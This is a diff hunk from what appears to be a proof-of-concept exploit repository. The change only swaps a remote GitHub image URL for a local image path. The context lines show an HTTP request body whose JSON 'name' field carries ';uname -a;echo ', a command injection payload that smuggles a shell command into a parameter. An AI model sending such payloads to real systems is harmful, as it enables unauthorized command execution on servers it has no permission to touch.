@@ -24,4 +24,4 @@ Content-Length: 68
 {"opid":"777777777777777777","name":";uname -a;echo ","type":"rest"}
 ```
 
-![d3caa0beea2be24633c0996d8ae8819c](https://github.com/wy876/POC/assets/139549762/1be7ce47-2ee2-476c-af85-c258c27dc95f)
+![d3caa0beea2be24633c0996d8ae8819c](../../images/1be7ce47-2ee2-476c-af85-c258c27dc95f.png)
